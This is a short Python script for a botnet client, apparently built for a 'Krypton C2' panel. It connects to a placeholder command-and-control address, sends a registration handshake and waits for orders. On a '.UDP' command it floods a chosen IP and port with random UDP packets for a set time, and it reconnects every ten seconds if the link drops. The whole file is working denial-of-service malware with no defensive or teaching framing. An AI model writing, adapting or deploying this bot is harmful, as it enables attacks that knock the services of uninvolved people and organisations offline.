#!/usr/bin/env python3
import socket
import threading
import random
import time

# CONFIGURATION
C2_HOST = 'YOUR.C2.IP.HERE'  # Replace with your C2 IP
C2_PORT = 1337               # Replace with your C2 port

# C2 BOT HANDSHAKE (required by Krypton C2)
BOT_PASSWORD = b'\xff\xff\xff\xff\75'

# Method: UDP Flood
def udp_flood(target, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)

    print(f"[+] Starting UDP flood: {target}:{port} for {duration}s")
    while time.time() < timeout:
        try:
            sock.sendto(payload, (target, port))
        except:
            continue
    print("[+] UDP flood completed.")

# Command handler
def handle_command(command):
    args = command.strip().split()
    cmd = args[0].upper()

    if cmd == "PING":
        return "PONG"

    elif cmd == ".UDP" and len(args) >= 4:
        ip = args[1]
        port = int(args[2])
        duration = int(args[3])
        threading.Thread(target=udp_flood, args=(ip, port, duration)).start()
        return f"Started UDP flood on {ip}:{port} for {duration}s"

    return f"Unknown command: {command}"

# Main bot logic
def bot_main():
    while True:
        try:
            s = socket.socket()
            s.connect((C2_HOST, C2_PORT))

            # Send required handshake to register as a bot
            s.send(BOT_PASSWORD)

            while True:
                data = s.recv(1024)
                if not data:
                    break
                response = handle_command(data.decode())
                if response:
                    try:
                        s.send(response.encode())
                    except:
                        pass

        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(10)  # retry after delay

if __name__ == "__main__":
    bot_main()
